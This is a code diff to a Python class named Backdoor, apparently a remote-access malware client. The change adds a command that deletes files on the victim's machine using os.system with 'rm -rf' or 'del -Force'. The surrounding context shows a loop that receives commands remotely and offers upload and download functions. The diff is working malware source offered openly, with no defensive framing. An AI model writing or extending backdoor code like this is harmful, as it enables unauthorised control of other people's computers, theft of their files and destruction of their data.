@@ -48,6 +48,13 @@ class Backdoor:
             file.write(base64.b64decode(content))
         return "[+] Upload successful."
 
+    def remove(self, path):
+        if os.path.exists(path):
+            os.system(f'del -Force {path}' if os.name == 'nt' else f'rm -rf {path}')
+            return(f"[+] {path} deleted")
+        else:
+            return(f"[-] {path} not found")
+
     def run(self):
         while True:
             command = str(self.reliable_receive())
@@ -59,6 +66,8 @@ class Backdoor:
                     exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_directory(command[1])
+                elif command[0] == "rm" and len(command) > 1:
+                    command_result = self.remove(command[1])
                 elif command[0] == "download":
                     command_result = self.read_file(command[1])
                 elif command[0] == "upload":
